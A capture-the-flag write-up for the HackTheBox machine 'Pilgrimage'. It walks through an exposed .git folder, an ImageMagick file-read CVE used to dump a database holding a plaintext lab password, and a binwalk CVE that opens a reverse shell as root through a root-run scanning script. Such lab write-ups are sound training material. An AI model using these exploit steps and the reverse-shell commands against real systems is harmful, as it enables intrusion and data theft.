# [Pilgrimage](https://app.hackthebox.com/machines/Pilgrimage) - 28/06/2023 - HackTheBox write-up

## User flag

### Discovery

First with a Nmap we can only find a SSH and a HTTP server, so it will be only a web based flag for the user. By navigate in the webpages nothing seems interesting, so I quickly run a `dirsearch` to gather more informations :
```bash
$ dirsearch -u http://pilgrimage.htb/
[...]
[09:48:14] 200 -    2KB - /.git/COMMIT_EDITMSG
[09:48:14] 200 -   73B  - /.git/description
[09:48:14] 200 -   23B  - /.git/HEAD
[09:48:14] 200 -  240B  - /.git/info/exclude
[09:48:14] 200 -   92B  - /.git/config
[09:48:14] 200 -    4KB - /.git/index
[09:48:14] 200 -  195B  - /.git/logs/HEAD
[09:48:14] 200 -  195B  - /.git/logs/refs/heads/master
[09:48:14] 200 -   41B  - /.git/refs/heads/master
```

We can find with it some interesting files in a forgotten `.git/` folder. In the `.git/COMMIT_EDITMSG` file we can find a listing of the committed files. There is PHP, JS, CSS and font style files, but also, one file who seems interesting, called `magick`.

We get it with `wget` and then execute the `file` command on it. It's a ELF-64 executable and we can quickly identify it as the *ImageMagick* executable. It makes sense because the web application purpose is to shrink images.

### Searching for vulnerability

With this executable we can run :
```bash
$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

The version isn't the latest release so we can search for any known CVEs on this version.

We find the **CVE-2022-44268**, who can use exploit ImageMagick to an arbitrary file read. There is a POC for this CVE, and in this POC an exemple use the resize command for test, so it must be this CVE to exploit.

### Exploitation

The POC can be found here : *https://github.com/voidz0r/CVE-2022-44268*.

It's a Rust program and we just need to run this command to generate the exploit image :
```bash
$ cargo run "file/to/read"
```

Then we can upload it, get the image response and inspect it with :
```
$ identify -verbose response.png
```

We get some hex string, and by decoding it with Python we can read our file. To make the manipulation easier I made a script who use this CVE to read a given file.

### Problems

With this exploit, I thought that the user flag is already mine, and I try to read the PHP file and find some credentials. But after some tries I cannot read those files, I can just read the `/etc/passwd` and some other files but nothing interesting.

After some time, I came back to the Git folder and use [`GitDump`](https://github.com/Ebryx/GitDump) to dump all the files in the repository. Then, I can find the Git objects, who contains all the files in the repo in a compressed format. With some scripts, I decompress the data and obtain all the source code of the web application.

Finally, we can find in the `index.php` the path to the database: `/var/db/pilgrimage`.

Now, I can come back to the exploit, and get the SQLite database with it. Then I can open it and dump the users tables, where we can find the passwords (in plain text):
```
emily:abigchonkyboi123
[...]
```

We can just reuse this password to obtain a SSH access to the server with the account of the same name, and then read the flag !

## Root flag

On the server, I found a `linpeas.sh` create by another user, so I directly start to enumerate. At first, I didn't find anything interesting in the scan, so I try other things. I searched in the home directory and we can found a configuration folder with a subdirectory `.config/binwalk`. So, these might be a clue and we need to follow it. Indeed, `binwalk` is installed in version 2.3.2. By searching *"binwalk v2.3.2"* we instantly find a well-known vulnerability: **CVE-2022-4510**. This vulnerability can be used to get remote code execution.

Quickly we can found a [POC](https://www.exploit-db.com/exploits/51249), and test it with our user `emily`. With the following commands we can get a reverse shell to our machine:
```
$ python3 exploit.py anyimage.png <IP> <PORT>
$ binwalk -e anyimage.png
```
The vulnerability trigger when extracting file with binwalk, so the last command will execute the python reverse shell previously added in the image with the POC.

### Searching for elevating privileges

Now, we have the vulnerability but we need to find a way to run the `binwalk -e <img>` as root. I came back to the enumeration and I found a file in running processes that doesn't catch my eyes the first time: `/usr/sbin/malwarescan.sh`. It contains the following script:
```
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```
In this script, who run as root, we can find that it used `binwalk -e` to detect if a file contains a script and remove it if it's the case. It extract all the files created in `/var/www/pilgrimage.htb/shrunk/` who comes from the web application upload, and detect it with the `inotifywait` command.

### Exploitation

So, we have now the vulnerability and the privilege escalation and we just have to run the following commands to obtain a reverse shell as root:
```bash
$ python3 exploit.py anyimage.png <IP> <PORT>
```
The result image is saved as *binwalk_exploit.png*
```bash
$ mv binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
```
The script will detect a new file, try to extract it and trigger the reverse shell.
